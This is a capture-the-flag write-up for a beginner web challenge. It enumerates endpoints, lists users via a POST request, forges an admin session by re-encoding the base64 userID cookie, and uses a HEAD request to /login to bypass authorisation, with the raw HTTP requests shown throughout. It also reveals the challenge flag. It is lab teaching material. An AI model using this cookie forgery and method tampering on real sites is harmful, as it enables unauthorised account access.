# Get ahead

- **Category:** beginner - web

## Challenge

> When trust has gone, each of us is alone. Trust is a very fragile thing.

I wonder what options we have here?

http://get-ahead.chal.cybears.io:8000

## Solution

Endpoints:
- /
- /login
- /list_users
- /add_user
- /display_flag


```
GET /list_users HTTP/1.1
```
returns
```
HTTP/1.1 405 METHOD NOT ALLOWED
Server: gunicorn
Date: Fri, 09 Apr 2021 00:28:11 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, POST
Content-Length: 178

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

Try POST
```
POST /list_users HTTP/1.1
Host: get-ahead.chal.cybears.io:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: userID=Z3Vlc3Q6a2wyUnRSSDZLZlNBd0ljcTI0YTd1L3VVVGpBYWpxT1lzVDg4SWo0OUtBNzdxSFdzYmhDRW4wMDN6SkZZNmdnYUt3ek9zUFBzSHZIUkFQQ01RZzNKUEE9PQ==
Upgrade-Insecure-Requests: 1
```

`admin` is a user
```
HTTP/1.1 200 OK
Server: gunicorn
Date: Fri, 09 Apr 2021 00:28:33 GMT
Connection: close
Content-Type: application/json
Content-Length: 69

{"user1": "admin", "user2": "guest", "user3": "api", "user4": "user"}
```

Using burp to get flag
```
GET /display_flag HTTP/1.1
Host: get-ahead.chal.cybears.io:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: userID=Z3Vlc3Q6a2wyUnRSSDZLZlNBd0ljcTI0YTd1L3VVVGpBYWpxT1lzVDg4SWo0OUtBNzdxSFdzYmhDRW4wMDN6SkZZNmdnYUt3ek9zUFBzSHZIUkFQQ01RZzNKUEE9PQ==
Upgrade-Insecure-Requests: 1
```

No flag, require correct flag param
```
GET /display_flag HTTP/1.1
Host: get-ahead.chal.cybears.io:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: userID=Z3Vlc3Q6a2wyUnRSSDZLZlNBd0ljcTI0YTd1L3VVVGpBYWpxT1lzVDg4SWo0OUtBNzdxSFdzYmhDRW4wMDN6SkZZNmdnYUt3ek9zUFBzSHZIUkFQQ01RZzNKUEE9PQ==
Upgrade-Insecure-Requests: 1
```

try
```
GET /display_flag?flag=admin HTTP/1.1
Host: get-ahead.chal.cybears.io:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: userID=Z3Vlc3Q6a2wyUnRSSDZLZlNBd0ljcTI0YTd1L3VVVGpBYWpxT1lzVDg4SWo0OUtBNzdxSFdzYmhDRW4wMDN6SkZZNmdnYUt3ek9zUFBzSHZIUkFQQ01RZzNKUEE9PQ==
Upgrade-Insecure-Requests: 1
Content-Length: 4
```

Just repeats the param
```
HTTP/1.1 200 OK
Server: gunicorn
Date: Fri, 09 Apr 2021 00:53:47 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 191

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>FLag Display</title>
</head>
<body>
<p>The flag given in the GET parameter is: <em>admin</em></p>
</body>
</html>
```

Notice userID is base64 encoded
`Z3Vlc3Q6a2wyUnRSSDZLZlNBd0ljcTI0YTd1L3VVVGpBYWpxT1lzVDg4SWo0OUtBNzdxSFdzYmhDRW4wMDN6SkZZNmdnYUt3ek9zUFBzSHZIUkFQQ01RZzNKUEE9PQ==`
decodes to
`guest:kl2RtRH6KfSAwIcq24a7u/uUTjAajqOYsT88Ij49KA77qHWsbhCEn003zJFY6ggaKwzOsPPsHvHRAPCMQg3JPA==`

Encode
`admin:kl2RtRH6KfSAwIcq24a7u/uUTjAajqOYsT88Ij49KA77qHWsbhCEn003zJFY6ggaKwzOsPPsHvHRAPCMQg3JPA==`
gives
`YWRtaW46a2wyUnRSSDZLZlNBd0ljcTI0YTd1L3VVVGpBYWpxT1lzVDg4SWo0OUtBNzdxSFdzYmhDRW4wMDN6SkZZNmdnYUt3ek9zUFBzSHZIUkFQQ01RZzNKUEE9PQ==`

Try login with HEAD method with new userID and follow redirects
```
HEAD /login HTTP/1.1
Host: get-ahead.chal.cybears.io:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: userID=YWRtaW46a2wyUnRSSDZLZlNBd0ljcTI0YTd1L3VVVGpBYWpxT1lzVDg4SWo0OUtBNzdxSFdzYmhDRW4wMDN6SkZZNmdnYUt3ek9zUFBzSHZIUkFQQ01RZzNKUEE9PQ==
Upgrade-Insecure-Requests: 1
```

```
GET /display_flag?flag=cybears{h34d_requ3sts_4r3_fun} HTTP/1.1
Host: get-ahead.chal.cybears.io:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: userID=YWRtaW46a2wyUnRSSDZLZlNBd0ljcTI0YTd1L3VVVGpBYWpxT1lzVDg4SWo0OUtBNzdxSFdzYmhDRW4wMDN6SkZZNmdnYUt3ek9zUFBzSHZIUkFQQ01RZzNKUEE9PQ==
Upgrade-Insecure-Requests: 1
````

Flag
```
cybears{h34d_requ3sts_4r3_fun}
```
